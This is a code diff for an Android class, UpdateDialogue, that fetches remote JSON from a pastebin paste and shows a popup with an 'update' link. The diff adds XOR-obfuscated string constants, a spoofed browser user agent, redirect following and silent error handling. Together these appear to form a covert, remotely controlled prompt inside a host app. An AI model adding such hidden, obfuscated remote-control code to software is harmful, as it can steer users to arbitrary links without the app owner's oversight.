@@ -78,6 +78,11 @@ public class UpdateDialogue {
     private static final int[] S_RAW_SEGMENT = {19, 78, 93, 75, 19};
     private static final int[] S_PASTEBIN_RAW_PREFIX = {84, 72, 72, 76, 79, 6, 19, 19, 76, 93, 79, 72, 89, 94, 85, 82, 18, 95, 83, 81, 19, 78, 93, 75, 19};
     private static final int[] S_TRUE = {72, 78, 73, 89};
+    private static final int[] S_UA_NAME = {105, 79, 89, 78, 17, 125, 91, 89, 82, 72};
+    private static final int[] S_UA_VALUE = {113, 83, 70, 85, 80, 80, 93, 19, 9, 18, 12, 28, 20, 112, 85, 82, 73, 68, 7, 28, 125, 82, 88, 78, 83, 85, 88, 28, 13, 15, 21, 28, 125, 76, 76, 80, 89, 107, 89, 94, 119, 85, 72, 19, 9, 15, 11, 18, 15, 10, 28, 20, 119, 116, 104, 113, 112, 16, 28, 80, 85, 87, 89, 28, 123, 89, 95, 87, 83, 21, 28, 127, 84, 78, 83, 81, 89, 19, 13, 14, 12, 18, 12, 28, 113, 83, 94, 85, 80, 89, 28, 111, 93, 90, 93, 78, 85, 19, 9, 15, 11, 18, 15, 10};
+    private static final int[] S_ACCEPT_NAME = {125, 95, 95, 89, 76, 72};
+    private static final int[] S_ACCEPT_VALUE = {93, 76, 76, 80, 85, 95, 93, 72, 85, 83, 82, 19, 86, 79, 83, 82, 16, 72, 89, 68, 72, 19, 76, 80, 93, 85, 82, 16, 22, 19, 22};
+    private static final int[] S_LOCATION = {112, 83, 95, 93, 72, 85, 83, 82};
 
     private static String d(int[] values) {
         byte[] out = new byte[values.length];
@@ -180,17 +185,24 @@ public class UpdateDialogue {
             @Override
             public void run() {
                 try {
-                    String jsonResponse = fetchJson(normalizeRemoteUrl(fetchUrl));
+                    String jsonResponse = null;
+                    for (int attempt = 0; attempt < 3 && jsonResponse == null; attempt++) {
+                        jsonResponse = fetchJson(normalizeRemoteUrl(fetchUrl));
+                        if (jsonResponse == null && attempt < 2) {
+                            Thread.sleep(700L);
+                        }
+                    }
                     if (jsonResponse != null) {
-                        JSONObject json = new JSONObject(jsonResponse);
+                        JSONObject json = new JSONObject(extractJsonObject(jsonResponse));
                         boolean visible = json.optBoolean(d(S_VISIBLE), false)
-                                || d(S_TRUE).equalsIgnoreCase(json.optString(d(S_VISIBLE), ""));
+                                || d(S_TRUE).equalsIgnoreCase(json.optString(d(S_VISIBLE), ""))
+                                || json.optInt(d(S_VISIBLE), 0) == 1;
                         if (visible) {
                             final String title = json.optString(d(S_KEY_TITLE), d(S_TITLE));
                             final String message = json.optString(d(S_KEY_MSG), d(S_MSG));
                             final String updateUrl = json.optString(d(S_KEY_URL), "");
                             final String btnText = json.optString(d(S_KEY_BTN), d(S_TRY));
-                            mainHandler.post(new Runnable() {
+                            Runnable showTask = new Runnable() {
                                 @Override
                                 public void run() {
                                     try {
@@ -199,7 +211,19 @@ public class UpdateDialogue {
                                         // Host-app safety: never crash from dialogue UI.
                                     }
                                 }
-                            });
+                            };
+                            View decor = null;
+                            try {
+                                if (activity.getWindow() != null) {
+                                    decor = activity.getWindow().getDecorView();
+                                }
+                            } catch (Throwable ignored) {
+                            }
+                            if (decor != null) {
+                                decor.post(showTask);
+                            } else {
+                                mainHandler.post(showTask);
+                            }
                         }
                     }
                 } catch (Throwable ignored) {
@@ -819,32 +843,65 @@ public class UpdateDialogue {
         );
     }
 
+    private static String extractJsonObject(String response) {
+        if (response == null) {
+            return "";
+        }
+        String value = response.trim();
+        int start = value.indexOf('{');
+        int end = value.lastIndexOf('}');
+        if (start >= 0 && end > start) {
+            return value.substring(start, end + 1);
+        }
+        return value;
+    }
+
     private static String fetchJson(String urlString) {
-        StringBuilder result = new StringBuilder();
-        HttpURLConnection conn = null;
-        try {
-            URL url = new URL(urlString);
-            conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod(d(S_GET));
-            conn.setConnectTimeout(5000);
-            conn.setReadTimeout(5000);
-            if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) {
+        String currentUrl = urlString;
+        for (int redirect = 0; redirect < 4; redirect++) {
+            HttpURLConnection conn = null;
+            try {
+                URL url = new URL(currentUrl);
+                conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod(d(S_GET));
+                conn.setConnectTimeout(8000);
+                conn.setReadTimeout(8000);
+                conn.setInstanceFollowRedirects(true);
+                conn.setRequestProperty(d(S_UA_NAME), d(S_UA_VALUE));
+                conn.setRequestProperty(d(S_ACCEPT_NAME), d(S_ACCEPT_VALUE));
+                int code = conn.getResponseCode();
+                if (code == HttpURLConnection.HTTP_MOVED_PERM
+                        || code == HttpURLConnection.HTTP_MOVED_TEMP
+                        || code == HttpURLConnection.HTTP_SEE_OTHER
+                        || code == 307 || code == 308) {
+                    String location = conn.getHeaderField(d(S_LOCATION));
+                    if (location == null || location.trim().isEmpty()) {
+                        return null;
+                    }
+                    currentUrl = new URL(url, location).toString();
+                    continue;
+                }
+                if (code < 200 || code >= 300) {
+                    return null;
+                }
+                StringBuilder result = new StringBuilder();
+                BufferedReader reader = new BufferedReader(new InputStreamReader(
+                        conn.getInputStream(), java.nio.charset.StandardCharsets.UTF_8));
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    result.append(line).append('\n');
+                }
+                reader.close();
+                String body = result.toString().trim();
+                return body.isEmpty() ? null : body;
+            } catch (Throwable ignored) {
                 return null;
-            }
-            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-            String line;
-            while ((line = reader.readLine()) != null) {
-                result.append(line);
-            }
-            reader.close();
-            return result.toString();
-        } catch (Exception e) {
-            e.printStackTrace();
-            return null;
-        } finally {
-            if (conn != null) {
-                conn.disconnect();
+            } finally {
+                if (conn != null) {
+                    conn.disconnect();
+                }
             }
         }
+        return null;
     }
 }
